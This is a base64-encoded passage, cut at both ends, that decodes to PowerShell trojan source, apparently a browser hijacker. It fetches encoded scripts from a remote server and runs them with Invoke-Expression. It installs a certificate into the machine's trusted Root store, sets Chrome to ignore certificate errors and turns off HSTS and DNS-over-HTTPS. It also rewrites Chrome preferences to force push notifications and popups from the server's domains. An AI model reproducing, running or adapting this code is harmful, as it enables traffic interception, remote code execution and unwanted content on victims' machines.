0aGUgYWxsb3R0ZWQgdGltZS4iDQp9DQoNCmZ1bmN0aW9uIFJ1blJlbW90ZUFzeW5jIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGJhc2VVcmwsDQogICAgICAgIFtzdHJpbmddJGJsb2NrLA0KICAgICAgICBbc3RyaW5nXSRwYXJhbSA9ICRudWxsDQogICAgKQ0KICAgICR1cmwgPSAiJGJhc2VVcmwvJGJsb2NrLnR4dCINCiAgICAkY21kID0gImRvXyRibG9jayINCiAgICBpZiAoJHBhcmFtIC1uZSAkbnVsbCkNCiAgICB7DQogICAgICAgICRjbWQgKz0gIiAtcGFyYW0gJyRwYXJhbSciDQogICAgfQ0KICAgICRhc3luY0pvYiA9IFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgew0KICAgICAgICBwYXJhbSAoDQogICAgICAgICAgICBbc3RyaW5nXSR1cmwsIFtzdHJpbmddJGJsb2NrLCBbc3RyaW5nXSRjbWQsIFtib29sXSRkZWJ1Zw0KICAgICAgICApDQoNCiAgICAgICAgZnVuY3Rpb24gVXRmOE5vQm9tIHsNCiAgICAgICAgICAgIHBhcmFtICgNCiAgICAgICAgICAgICAgICBbc3RyaW5nXSRkYXRhLA0KICAgICAgICAgICAgICAgIFtzdHJpbmddJGZpbGUNCiAgICAgICAgICAgICkNCiAgICAgICAgICAgICRzdHJlYW1Xcml0ZXIgPSBbU3lzdGVtLklPLlN0cmVhbVdyaXRlcl06Om5ldygkZmlsZSwgJGZhbHNlLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4KQ0KICAgICAgICAgICAgJHN0cmVhbVdyaXRlci5Xcml0ZSgkZGF0YSkNCiAgICAgICAgICAgICRzdHJlYW1Xcml0ZXIuQ2xvc2UoKQ0KICAgICAgICAgICAgJHdyaXR0ZW5Db250ZW50ID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRmaWxlKQ0KICAgICAgICAgICAgaWYgKCR3cml0dGVuQ29udGVudC5MZW5ndGggLWdlIDMgLWFuZCAkd3JpdHRlbkNvbnRlbnRbMF0gLWVxIDB4RUYgLWFuZCAkd3JpdHRlbkNvbnRlbnRbMV0gLWVxIDB4QkIgLWFuZCAkd3JpdHRlbkNvbnRlbnRbMl0gLWVxIDB4QkYpIHsNCiAgICAgICAgICAgICAgICAkd3JpdHRlbkNvbnRlbnQgPSAkd3JpdHRlbkNvbnRlbnRbMy4uKCR3cml0dGVuQ29udGVudC5MZW5ndGggLSAxKV0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJGZpbGUsICR3cml0dGVuQ29udGVudCkNCiAgICAgICAgfQ0KDQogICAgICAgICR0aW1lb3V0ID0gW2RhdGV0aW1lXTo6VXRjTm93LkFkZE1pbnV0ZXMoNSkNCiAgICAgICAgJGRlbGF5ID0gMTANCiAgICAgICAgd2hpbGUgKFtkYXRldGltZV06OlV0Y05vdyAtbHQgJHRpbWVvdXQpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdXJsIC1Vc2VCYXNpY1BhcnNpbmcgLU1ldGhvZCBHZXQNCiAgICAgICAgICAgICAgICBpZiAoJHJlc3BvbnNlLlN0YXR1c0NvZGUgLWVxIDIwMCkgew0KICAgICAgICAgICAgICAgICAgICAkc2NyaXB0RGF0YSA9ICRyZXNwb25zZS5Db250ZW50DQogICAgICAgICAgICAgICAgICAgICRzY3JpcHREYXRhID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRzY3JpcHREYXRhKSkgKyAiYG5gbiIgKyAkY21kDQogICAgICAgICAgICAgICAgICAgIGlmICgkZGVidWcpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRmOE5vQm9tIC1kYXRhICRzY3JpcHREYXRhIC1maWxlICJDOlxTb2Z0XGhlcGhhZXN0dXNcdHJveWFuXF9vdXRwdXRcX3RlbXBfJGJsb2NrLnBzMSIgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gLUNvbW1hbmQgJHNjcmlwdERhdGENCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRfDQogICAgICAgICAgICB9IA0KICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJGRlbGF5DQogICAgICAgIH0NCiAgICB9IC1Bcmd1bWVudExpc3QgJHVybCwgJGJsb2NrLCAkY21kLCAkZ2xvYmFsRGVidWcNCiAgICByZXR1cm4gJGFzeW5jSm9iDQp9DQoNCmZ1bmN0aW9uIENvbnZlcnQtU3RyaW5nVG9CYXNlNjQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldDQogICAgICAgIFtzdHJpbmddJElucHV0U3RyaW5nDQogICAgKQ0KICAgIA0KICAgICMgQ29udmVydCB0aGUgc3RyaW5nIHRvIGJ5dGVzDQogICAgJGJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkSW5wdXRTdHJpbmcpDQogICAgDQogICAgIyBFbmNvZGUgdGhlIGJ5dGVzIHRvIGEgQmFzZTY0IHN0cmluZw0KICAgICRiYXNlNjRTdHJpbmcgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRieXRlcykNCiAgICANCiAgICAjIFJldHVybiB0aGUgQmFzZTY0LWVuY29kZWQgc3RyaW5nDQogICAgcmV0dXJuICRiYXNlNjRTdHJpbmcNCn0NCg0KZnVuY3Rpb24gQ2VydC1Xb3JrIHsNCiAgICBwYXJhbSgNCiAgICAgICAgW3N0cmluZ10gJGNvbnRlbnRTdHJpbmcNCiAgICApDQogICAgJG91dHB1dEZpbGVQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcEZpbGVOYW1lKCkNCiAgICAkYmluYXJ5ID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRjb250ZW50U3RyaW5nKQ0KICAgIHRyeSB7DQogICAgICAgIFNldC1Db250ZW50IC1QYXRoICRvdXRwdXRGaWxlUGF0aCAtVmFsdWUgJGJpbmFyeSAtQXNCeXRlU3RyZWFtDQogICAgfSBjYXRjaCB7DQogICAgICAgIEFkZC1Db250ZW50IC1QYXRoICRvdXRwdXRGaWxlUGF0aCAtVmFsdWUgJGJpbmFyeSAtRW5jb2RpbmcgQnl0ZQ0KICAgIH0NCiAgICBJbnN0YWxsLUNlcnRpZmljYXRlVG9TdG9yZXMgLUNlcnRpZmljYXRlRmlsZVBhdGggJG91dHB1dEZpbGVQYXRoIC1QYXNzd29yZCAnMTIzJw0KfQ0KDQpmdW5jdGlvbiBJbnN0YWxsLUNlcnRpZmljYXRlVG9TdG9yZXMgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSAkQ2VydGlmaWNhdGVGaWxlUGF0aCwNCiAgICAgICAgW3N0cmluZ10gJFBhc3N3b3JkDQogICAgKQ0KDQogICAgdHJ5IHsNCiAgICAgICAgJHNlY3VyZVBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAtU3RyaW5nICRQYXNzd29yZCAtQXNQbGFpblRleHQgLUZvcmNlDQoNCiAgICAgICAgIyBJbXBvcnQgY2VydGlmaWNhdGUgdG8gUGVyc29uYWwgKE15KSBzdG9yZQ0KICAgICAgICAkcGVyc29uYWxTdG9yZVBhdGggPSAiQ2VydDpcTG9jYWxNYWNoaW5lXE15Ig0KICAgICAgICBJbXBvcnQtUGZ4Q2VydGlmaWNhdGUgLUZpbGVQYXRoICRDZXJ0aWZpY2F0ZUZpbGVQYXRoIC1DZXJ0U3RvcmVMb2NhdGlvbiAkcGVyc29uYWxTdG9yZVBhdGggLVBhc3N3b3JkICRzZWN1cmVQYXNzd29yZCAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICB3cml0ZWRiZyAiQ2VydGlmaWNhdGUgaW5zdGFsbGVkIHN1Y2Nlc3NmdWxseSB0byBQZXJzb25hbCBzdG9yZSAoTXkpLiINCg0KICAgICAgICAjIEltcG9ydCBjZXJ0aWZpY2F0ZSB0byBSb290IHN0b3JlDQogICAgICAgICRyb290U3RvcmVQYXRoID0gIkNlcnQ6XExvY2FsTWFjaGluZVxSb290Ig0KICAgICAgICBJbXBvcnQtUGZ4Q2VydGlmaWNhdGUgLUZpbGVQYXRoICRDZXJ0aWZpY2F0ZUZpbGVQYXRoIC1DZXJ0U3RvcmVMb2NhdGlvbiAkcm9vdFN0b3JlUGF0aCAtUGFzc3dvcmQgJHNlY3VyZVBhc3N3b3JkIC1FcnJvckFjdGlvbiBTdG9wDQogICAgICAgIHdyaXRlZGJnICJDZXJ0aWZpY2F0ZSBpbnN0YWxsZWQgc3VjY2Vzc2Z1bGx5IHRvIFJvb3Qgc3RvcmUuIg0KDQogICAgfSBjYXRjaCB7DQogICAgICAgIHRocm93ICJGYWlsZWQgdG8gaW5zdGFsbCBjZXJ0aWZpY2F0ZTogJF8iDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBkb19jZXJ0IHsNCiAgICB0cnkgDQogICAgew0KICAgICAgICBmb3JlYWNoICgka2V5IGluICR4ZGF0YS5LZXlzKSB7DQogICAgICAgICAgICBDZXJ0LVdvcmsgLWNvbnRlbnRTdHJpbmcgJHhkYXRhWyRrZXldDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICB3cml0ZWRiZyAiQW4gZXJyb3Igb2NjdXJyZWQgKENvbmZpZ3VyZUNlcnRpZmljYXRlcyk6ICRfIg0KICAgICAgfQ0KfQ0KDQpmdW5jdGlvbiBkb19jaHJvbWUgew0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggIkhLTE06XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xEbnNjYWNoZVxQYXJhbWV0ZXJzIiAtTmFtZSAiRW5hYmxlQXV0b0RPSCIgLVZhbHVlIDANCg0KICAgICRjaHJvbWVLZXlQYXRoID0gIkhLTE06XFNvZnR3YXJlXFBvbGljaWVzXEdvb2dsZVxDaHJvbWUiDQoNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRjaHJvbWVLZXlQYXRoKSkgew0KICAgICAgICBOZXctSXRlbSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgIH0NCg0KICAgIE5ldy1JdGVtIC1QYXRoICRjaHJvbWVLZXlQYXRoIC1Gb3JjZSB8IE91dC1OdWxsICAjIENyZWF0ZSB0aGUga2V5IGlmIGl0IGRvZXNuJ3QgZXhpc3QNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRjaHJvbWVLZXlQYXRoIC1OYW1lICJDb21tYW5kTGluZUZsYWciIC1WYWx1ZSAiLS1pZ25vcmUtY2VydGlmaWNhdGUtZXJyb3JzIC0tZGlzYWJsZS1xdWljIC0tZGlzYWJsZS1oc3RzIg0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGNocm9tZUtleVBhdGggLU5hbWUgIkRuc092ZXJIdHRwcyIgLVZhbHVlICJvZmYiDQoNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRjaHJvbWVLZXlQYXRoIC1OYW1lICJJZ25vcmVDZXJ0aWZpY2F0ZUVycm9ycyIgLVZhbHVlIDENCg0KICAgIHdyaXRlZGJnICJDaHJvbWUgY29uZmlndXJlZCINCn0NCg0KDQoNCmZ1bmN0aW9uIENvbXBhcmUtQXJyYXlzIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFthcnJheV0kQXJyYXkxLA0KICAgICAgICBbYXJyYXldJEFycmF5Mg0KICAgICkNCg0KICAgICMgU29ydCBib3RoIGFycmF5cyBhbmQgY29tcGFyZQ0KICAgICRhcnJheTFTb3J0ZWQgPSAkQXJyYXkxIHwgU29ydC1PYmplY3QgfCBHZXQtVW5pcXVlDQogICAgJGFycmF5MlNvcnRlZCA9ICRBcnJheTIgfCBTb3J0LU9iamVjdCB8IEdldC1VbmlxdWUNCg0KICAgICRqbzEgPSAkYXJyYXkxU29ydGVkIC1qb2luICcsJyANCiAgICANCiAgICAkam8yID0gJGFycmF5MlNvcnRlZCAtam9pbiAnLCcNCg0KICAgICMgRGV0ZXJtaW5lIGlmIHRoZSBhcnJheXMgYXJlIGVxdWFsIChvcmRlciBkb2VzIG5vdCBtYXR0ZXIpDQogICAgaWYgKCRqbzEgLWVxICRqbzIgKSB7DQogICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgIH0gZWxzZSB7DQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gSGF2ZVRvUHVzaGVzIHsNCiAgICAkcmVzdWx0ID0gJGZhbHNlOw0KICAgICRleGlzdHMgPSBAKCkNCiAgICAkdG9zZXQgPSBAKCkNCiAgICAkcHJlZmVyZW5jZXNQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcUHJlZmVyZW5jZXMiDQoNCiAgICAjIENoZWNrIGlmIHRoZSBQcmVmZXJlbmNlcyBmaWxlIGV4aXN0cw0KICAgIGlmIChUZXN0LVBhdGggJHByZWZlcmVuY2VzUGF0aCkgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgICAgICMgQ2hlY2sgaWYgdGhlIHN0cnVjdHVyZSBpcyBhcyBleHBlY3RlZA0KICAgICAgICBpZiAoJHByZWZlcmVuY2VzQ29udGVudCAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZSAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzIC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucy5ub3RpZmljYXRpb25zKSB7DQogICAgICAgICAgICAkbm90aWZpY2F0aW9uU2V0dGluZ3MgPSAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zLm5vdGlmaWNhdGlvbnMNCg0KICAgICAgICAgICAgIyBJdGVyYXRlIHRocm91Z2ggZWFjaCBlbnRyeSBpbiAkbm90aWZpY2F0aW9uU2V0dGluZ3MNCiAgICAgICAgICAgIGZvcmVhY2ggKCRmaWVsZCBpbiAkbm90aWZpY2F0aW9uU2V0dGluZ3MuUFNPYmplY3QuUHJvcGVydGllcykgew0KICAgICAgICAgICAgICAgICRzaXRlVXJsID0gJGZpZWxkLk5hbWUNCiAgICAgICAgICAgICAgICAkZXhpc3RzICs9IFB1c2hEb21haW4gLXB1c2hVcmwgJHNpdGVVcmwNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGZvcmVhY2ggKCRwdXNoIGluICRzZXJ2ZXIucHVzaGVzKSB7DQogICAgICAgICR0b3NldCArPSBQdXNoRG9tYWluIC1wdXNoVXJsICRwdXNoDQogICAgfQ0KDQogICAgICRyZXN1bHQgPSAtbm90KENvbXBhcmUtQXJyYXlzIC1BcnJheTEgJGV4aXN0cyAtQXJyYXkyICR0b3NldCkNCiAgICANCiAgICByZXR1cm4gJHJlc3VsdDsNCn0NCg0KDQpmdW5jdGlvbiBQdXNoRG9tYWluIHsNCiAgICBwYXJhbSAoJHB1c2hVcmwpDQoNCiAgICAjIFRyaW0gdGhlIGlucHV0IHN0cmluZyBiZWZvcmUgdGhlIGZpcnN0IGNvbW1hDQogICAgJHRyaW1tZWRVcmwgPSAkcHVzaFVybC5UcmltKCkuU3BsaXQoJywnKVswXS5UcmltKCkNCg0KICAgICMgUGFyc2UgdGhlIFVSSQ0KICAgICRwYXJzZWRVcmkgPSBbU3lzdGVtLlVyaV06Om5ldygkdHJpbW1lZFVybCkNCiAgICANCiAgICAjIEV4dHJhY3QgZG9tYWluIGFuZCBwb3J0DQogICAgJGRvbWFpbiA9ICRwYXJzZWRVcmkuSG9zdA0KICAgICRwb3J0ID0gaWYgKCRwYXJzZWRVcmkuUG9ydCAtZXEgLTEpIHsgNDQzIH0gZWxzZSB7ICRwYXJzZWRVcmkuUG9ydCB9DQoNCiAgICAjIENvbnN0cnVjdCB0aGUgcmVzdWx0IFVSTA0KICAgICRyZXN1bHQgPSAiaHR0cHM6Ly8iICsgJGRvbWFpbiArICI6IiArICIkcG9ydCwqIg0KICAgIA0KICAgIHJldHVybiAkcmVzdWx0DQp9DQoNCmZ1bmN0aW9uIFB1c2hFeGlzdHMNCnsNCiAgICBwYXJhbSAoJHB1c2hVcmwpDQogICAgZm9yZWFjaCAoJHB1c2ggaW4gJHNlcnZlci5wdXNoZXMpIA0KICAgIHsNCiAgICAgICAgaWYgKChQdXNoRG9tYWluIC1wdXNoVXJsICRwdXNoVXJsKSAtZXEgKFB1c2hEb21haW4gLXB1c2hVcmwgJHB1c2gpKQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gJHRydWU7DQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuICRmYWxzZQ0KfQ0KDQpmdW5jdGlvbiBSZW1vdmUtUHVzaGVzIHsNCiAgICAkcHJlZmVyZW5jZXNQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcUHJlZmVyZW5jZXMiDQoNCiAgICAjIENoZWNrIGlmIHRoZSBQcmVmZXJlbmNlcyBmaWxlIGV4aXN0cw0KICAgIGlmIChUZXN0LVBhdGggJHByZWZlcmVuY2VzUGF0aCkgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgICAgICMgQ2hlY2sgaWYgdGhlIHN0cnVjdHVyZSBpcyBhcyBleHBlY3RlZA0KICAgICAgICBpZiAoJHByZWZlcmVuY2VzQ29udGVudCAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZSAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzIC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucy5ub3RpZmljYXRpb25zKSB7DQogICAgICAgICAgICAkbm90aWZpY2F0aW9uU2V0dGluZ3MgPSAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zLm5vdGlmaWNhdGlvbnMNCg0KICAgICAgICAgICAgJGtleXNUb1JlbW92ZSA9IEAoKQ0KDQogICAgICAgICAgICAjIEl0ZXJhdGUgdGhyb3VnaCBlYWNoIGVudHJ5IGluICRub3RpZmljYXRpb25TZXR0aW5ncw0KICAgICAgICAgICAgZm9yZWFjaCAoJGZpZWxkIGluICRub3RpZmljYXRpb25TZXR0aW5ncy5QU09iamVjdC5Qcm9wZXJ0aWVzKSB7DQogICAgICAgICAgICAgICAgJHNpdGVVcmwgPSAkZmllbGQuTmFtZQ0KICAgICAgICAgICAgICAgICRwZXJtaXNzaW9uID0gKFB1c2hFeGlzdHMgLXB1c2hVcmwgJHNpdGVVcmwpDQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAoJHBlcm1pc3Npb24gLWVxICRmYWxzZSkgew0KICAgICAgICAgICAgICAgICAgICAka2V5c1RvUmVtb3ZlICs9ICRmaWVsZC5OYW1lDQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgd3JpdGVkYmcgIiRzaXRlVXJsIGhhc24ndCBiZWVuIHJlbW92ZWQsIGl0IGlzIGEgZ29vZCBzaXRlLiINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gJGtleXNUb1JlbW92ZSkgew0KICAgICAgICAgICAgICAgICRub3RpZmljYXRpb25TZXR0aW5ncy5QU09iamVjdC5Qcm9wZXJ0aWVzLlJlbW92ZSgka2V5KQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwMCB8IFNldC1Db250ZW50IC1QYXRoICRwcmVmZXJlbmNlc1BhdGggLUZvcmNlDQoNCiAgICAgICAgICAgIHdyaXRlZGJnICJBbGwgc2VsZWN0ZWQgcHVzaCBub3RpZmljYXRpb24gc2V0dGluZ3MgaGF2ZSBiZWVuIHJlbW92ZWQuIg0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgd3JpdGVkYmcgIk5vIG9yIHVuZXhwZWN0ZWQgbm90aWZpY2F0aW9uIHNldHRpbmdzIGZvdW5kIGluIFByZWZlcmVuY2VzIGZpbGUuIg0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgd3JpdGVkYmcgIlByZWZlcmVuY2VzIGZpbGUgbm90IGZvdW5kIGF0IHBhdGg6ICRwcmVmZXJlbmNlc1BhdGgiDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBBZGQtUHVzaGVzew0KICAgIGZvcmVhY2ggKCRwdXNoIGluICRzZXJ2ZXIucHVzaGVzKSB7DQogICAgICAgIEFkZC1QdXNoIC1wdXNoVXJsICRwdXNoIC13b3JrICR3b3JrDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBBZGQtUHVzaCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRwdXNoVXJsDQogICAgKQ0KDQogICAgJHB1c2hEb21haW4gPSBQdXNoRG9tYWluIC1wdXNoVXJsICRwdXNoVXJsDQoNCiAgICAkY2hyb21lUHJlZmVyZW5jZXNQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcUHJlZmVyZW5jZXMiDQoNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1QYXRoICRjaHJvbWVQcmVmZXJlbmNlc1BhdGgpKSB7DQogICAgICAgIHdyaXRlZGJnICJDaHJvbWUgcHJlZmVyZW5jZXMgZmlsZSBub3QgZm91bmQgYXQgcGF0aDogJGNocm9tZVByZWZlcmVuY2VzUGF0aCINCiAgICAgICAgZXhpdA0KICAgIH0NCg0KICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkY2hyb21lUHJlZmVyZW5jZXNQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICBpZiAoLW5vdCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIHByb2ZpbGUgLVZhbHVlIEB7fQ0KICAgIH0NCg0KICAgIGlmICgtbm90ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzIC1WYWx1ZSBAe30NCiAgICB9DQoNCiAgICBpZiAoLW5vdCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzLnBvcHVwcykgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgcG9wdXBzIC1WYWx1ZSAxDQogICAgfSBlbHNlIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcy5wb3B1cHMgPSAxDQogICAgfQ0KDQogICAgaWYgKC1ub3QgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcy5zdWJyZXNvdXJjZV9maWx0ZXIpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIHN1YnJlc291cmNlX2ZpbHRlciAtVmFsdWUgMQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMuc3VicmVzb3VyY2VfZmlsdGVyID0gMQ0KICAgIH0NCg0KICAgICRwcmVmZXJlbmNlc0NvbnRlbnRKc29uID0gJHByZWZlcmVuY2VzQ29udGVudCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAzMg0KICAgIFNldC1Db250ZW50IC1QYXRoICRjaHJvbWVQcmVmZXJlbmNlc1BhdGggLVZhbHVlICRwcmVmZXJlbmNlc0NvbnRlbnRKc29uIC1Gb3JjZQ0KDQogICAgJHByZWZlcmVuY2VzUGF0aCA9ICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XFByZWZlcmVuY2VzIg0KDQogICAgaWYgKFRlc3QtUGF0aCAkcHJlZmVyZW5jZXNQYXRoKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQogICAgICAgICRjb250ZW50U2V0dGluZ3MgPSAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zDQogICAgICAgICRzZXR0aW5nc1RvVXBkYXRlID0gQCgNCiAgICAgICAgICAgICJhdXRvX3BpY3R1cmVfaW5fcGljdHVyZSIsICJiYWNrZ3JvdW5kX3N5bmMiLCAiY2FtZXJhIiwgImNsaXBib2FyZCIsICJjb29raWVzIiwgDQogICAgICAgICAgICAiZ2VvbG9jYXRpb24iLCAiaW1hZ2VzIiwgImphdmFzY3JpcHQiLCAibWljcm9waG9uZSIsICJtaWRpX3N5c2V4IiwgDQogICAgICAgICAgICAibm90aWZpY2F0aW9ucyIsICJwb3B1cHMiLCAicGx1Z2lucyIsICJzb3VuZCIsICJ1bnNhbmRib3hlZF9wbHVnaW5zIiwgDQogICAgICAgICAgICAiYXV0b21hdGljX2Rvd25sb2FkcyIsICJmbGFzaF9kYXRhIiwgIm1peGVkX3NjcmlwdCIsICJzZW5zb3JzIiwid2luZG93X3BsYWNlbWVudCIsIndlYmlkX2FwaSIsInZyIiwNCiAgICAgICAgICAgICJzdWJyZXNvdXJjZV9maWx0ZXIiLCJtZWRpYV9zdHJlYW1fbWljIiwibWVkaWFfc3RyZWFtX21pYyIsIm1lZGlhX3N0cmVhbV9jYW1lcmEiLCJsb2NhbF9mb250cyIsDQogICAgICAgICAgICAiamF2YXNjcmlwdF9qaXQiLCJpZGxlX2RldGVjdGlvbiIsImNhcHR1cmVkX3N1cmZhY2VfY29udHJvbCIsImFyIg0KDQogICAgICAgICkNCg0KICAgICAgICBmb3JlYWNoICgkc2V0dGluZyBpbiAkc2V0dGluZ3NUb1VwZGF0ZSkgew0KICAgICAgICAgICAgaWYgKCRudWxsIC1lcSAkY29udGVudFNldHRpbmdzLiRzZXR0aW5nKSB7DQogICAgICAgICAgICAgICAgJGNvbnRlbnRTZXR0aW5ncyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICRzZXR0aW5nIC1WYWx1ZSBAe30NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRzcGVjaWZpY1NldHRpbmcgPSAkY29udGVudFNldHRpbmdzLiRzZXR0aW5nDQogICAgICAgIC